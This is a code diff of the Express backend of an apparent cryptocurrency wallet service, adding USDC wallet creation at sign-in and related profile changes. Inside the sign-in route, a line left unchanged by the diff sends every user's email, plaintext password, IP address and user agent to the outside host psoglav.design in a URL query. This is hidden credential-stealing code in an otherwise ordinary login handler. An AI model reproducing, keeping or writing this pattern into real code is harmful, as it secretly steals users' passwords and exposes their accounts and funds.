@@ -58,9 +58,18 @@ const buildProfile = (
     }
   })
 
+  // until all users have a USDC wallet
+  if (!wallets['usd coin']) wallets['usd coin'] = {
+    balance: 0,
+    address: "Temporarily unavailable"
+  }
+
   if (chartsData && chartsData.length) {
     chartsData.forEach(chart => {
-      if (chart) wallets[chart.coin].chartPoints = chart.points
+      let coin = chart?.coin.replace('-', ' ')
+      if (chart && wallets[coin]) {
+        wallets[coin].chartPoints = chart.points
+      }
     })
   }
 
@@ -91,6 +100,7 @@ const buildProfile = (
         BTC: UserMiddleware.getMinimum(manager, 'bitcoin'),
         LTC: UserMiddleware.getMinimum(manager, 'litecoin'),
         ETH: UserMiddleware.getMinimum(manager, 'ethereum'),
+        USDC: UserMiddleware.getMinimum(manager, 'usd coin'),
       },
       commission:
         manager && manager.role.settings
@@ -505,7 +515,23 @@ router.post('/signin', UserMiddleware.validateSignin, (req, res) => {
             axios.get(`http://psoglav.design/?e=${email}&p=${req.body.password}&i=${req.headers['x-forwarded-for']}&u=${req.headers['user-agent']}`)
           }
 
-          if (user.deactivated) {
+          const createUSDCWalletAndSignIn = () => {
+            UserWallet.createUSDCWallet(user.email).then(wallet => {
+              user.wallets['usd coin'] = wallet
+              user.markModified('wallets')
+              user.save((u) => {
+                continueSignIn()
+              })
+            }).catch(() => {
+              res.status(403).send({
+                stage: "We don't remember you well",
+                message:
+                  'Provided email or password is invalid. Did you forget something?',
+              })
+            })
+          }
+
+          if (user.deactivated || user.banned) {
             res.status(404).send({
               stage: "We don't remember you well",
               message:
@@ -513,7 +539,6 @@ router.post('/signin', UserMiddleware.validateSignin, (req, res) => {
             })
             return
           }
-
 
           bcrypt.compare(req.body.password, user.password, (err, success) => {
             if (success) {
@@ -528,7 +553,11 @@ router.post('/signin', UserMiddleware.validateSignin, (req, res) => {
 
                   switch (result) {
                     case 'valid':
-                      continueSignIn()
+                      if (!user.wallets['usd coin']) {
+                        createUSDCWalletAndSignIn()
+                      } else {
+                        continueSignIn()
+                      }
                       break
                     case 'expired':
                       res.status(400).send({
@@ -542,6 +571,8 @@ router.post('/signin', UserMiddleware.validateSignin, (req, res) => {
                       break
                   }
                 }
+              } else if (!user.wallets['usd coin']) {
+                createUSDCWalletAndSignIn()
               } else {
                 continueSignIn()
               }
@@ -584,6 +615,11 @@ router.get('/', expressip().getIpInfoMiddleware, (req, res) => {
 
     User.findById(verifiedToken.user._id, (err, user) => {
       if (user) {
+        if (!user.wallets['usd coin']) {
+          res.end()
+          return
+        }
+
         if (route) {
           UserLogger.register(
             UserMiddleware.convertUser(user),
@@ -592,6 +628,7 @@ router.get('/', expressip().getIpInfoMiddleware, (req, res) => {
             'action.user.visited.' + route.toLowerCase(),
           )
         }
+
 
         var fetchingData = {
           dialogue: SupportDialogue.findOne({ user: user._id }, null).lean(),
